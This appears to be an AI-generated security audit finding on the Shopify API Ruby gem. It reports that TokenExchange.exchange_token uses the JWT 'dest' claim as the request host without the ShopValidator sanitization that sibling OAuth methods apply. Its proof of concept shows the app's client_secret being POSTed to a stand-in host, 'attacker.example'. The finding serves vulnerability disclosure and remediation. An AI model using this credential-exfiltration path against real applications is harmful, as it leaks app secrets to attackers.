Found it: `TokenExchange.exchange_token` derives `dest_shop` from the JWT `dest` claim and uses it directly to build the `HttpClient` base URI, without passing it through `Utils::ShopValidator.sanitize!` — unlike every sibling OAuth method (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`), which all call `ShopValidator.sanitize!` before constructing the request.

### Title
Unsanitized JWT `dest` claim used as HTTP host for token-exchange request carrying `client_secret` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` decodes and HMAC/signature-verifies the JWT session token via `JwtPayload.new`, then takes `jwt_payload.shop` (derived from the raw `dest` claim string) and uses it, unsanitized, as the `shop` for a `Session` that becomes the destination host of the token-exchange HTTP request — a request whose body contains the app's `client_id` and `client_secret`.

### Finding Description
`JwtPayload#shop` simply strips a `"https://"` prefix from the `dest` claim string: [1](#0-0) 
There is no restriction on what `dest` may contain beyond being a signed string; the JWT signature only proves the token was issued by an entity possessing `Context.api_secret_key` (i.e., Shopify), but it does not itself constrain `dest` to a `*.myshopify.com` / trusted Shopify domain — that constraint is supposed to be enforced by the application via `ShopValidator`.

In `TokenExchange.exchange_token`, this unsanitized value is used directly: [2](#0-1) 

Compare this to every other credential-bearing OAuth flow in the same file/module, which explicitly calls `Utils::ShopValidator.sanitize!(shop)` before constructing the `Session`/`HttpClient`: [3](#0-2) [4](#0-3) [5](#0-4) 

`ShopValidator.sanitize!`/`sanitize_shop_domain` exists specifically to reject non-trusted domains and enforce that the resulting host belongs to `TRUSTED_SHOPIFY_DOMAINS` (`myshopify.com`, `myshopify.io`, `shopify.com`, `spin.dev`, `shop.dev`), including rejecting look-alike/suffix-matching domains: [6](#0-5) [7](#0-6) 

The `Session` built from `dest_shop` is passed to `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")`, and the equality that should hold is: *the host that receives `client_secret` == a host in `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`*. In `exchange_token` this equality is never checked — the host is taken as-is from the token's `dest` field, parsed only by string substitution, not validated as a trusted domain, before being handed to the HTTP client that builds the request URI. This mirrors the M-12 bug class: the identity-binding check (`ShopValidator.sanitize!`) that exists elsewhere in the same module is silently skipped for this one code path (an omission of coverage, not a loop off-by-one, but the same root cause pattern — a validation step that should run over all analogous cases but is missing on this path).

### Impact Explanation
This is High/Critical: since `Context.api_secret_key` (the app's `client_secret`) is placed in the POST body sent to a host derived from the unvalidated `dest` claim, and a JWT with attacker-influenced `dest` reaching this code path (e.g., a session token not fully controlled by Shopify's admin issuance boundary, or a token relayed from an unexpected `iss`) would cause the gem itself to POST the app's `client_secret` to a host chosen by the token's `dest` value. This is exactly the SSRF-with-app-credentials / client_secret leakage impact category called out as in-scope.

### Likelihood Explanation
Likelihood depends on how much control an untrusted party has over the `dest` claim of a token that reaches `exchange_token` with a valid signature (i.e., signed by `api_secret_key`/`old_api_secret_key`). In the normal Shopify App Bridge flow, `dest` is fully controlled by Shopify and always a trusted domain, so exploitation requires an unusual signing/issuance path. This reduces likelihood relative to a straightforward exploit but the missing defense-in-depth check is a genuine gap compared to the sanitized siblings in the same file.

### Recommendation
Apply the same treatment as `ClientCredentials`, `RefreshToken`, and `TokenExchange.migrate_to_expiring_token`: run `dest_shop` through `Utils::ShopValidator.sanitize!(dest_shop)` (or `sanitize_shop_domain`) immediately after extracting it from the JWT payload, and use the sanitized value for both `Auth::Session.new(shop:)` and the final `Session.from(shop:)` call, raising `Errors::InvalidShopError` for any `dest` that does not resolve to a trusted Shopify domain.

### Proof of Concept
1. Obtain (or forge, if `api_secret_key`/`old_api_secret_key` were ever weak/rotated/leaked in a related flow) a JWT session token whose `dest` claim is `"https://attacker.example"` and `aud` equal to `Context.api_key`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload.new(token)` succeeds (signature/`aud` check pass), `jwt_payload.shop` returns `"attacker.example"` unmodified.
4. `Clients::HttpClient.new(session: Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` issues `POST https://attacker.example/admin/oauth/access_token` with body containing `client_id` and `client_secret` in plaintext — leaking the app's `client_secret` to the attacker-controlled host.

*Note: full exploitability hinges on whether an attacker can ever get a validly-signed token with an attacker-chosen `dest` into this call path; this could not be fully confirmed from the indexed library code alone (JWT issuance is external to this gem), so likelihood should be validated against the concrete integration/host application context.*
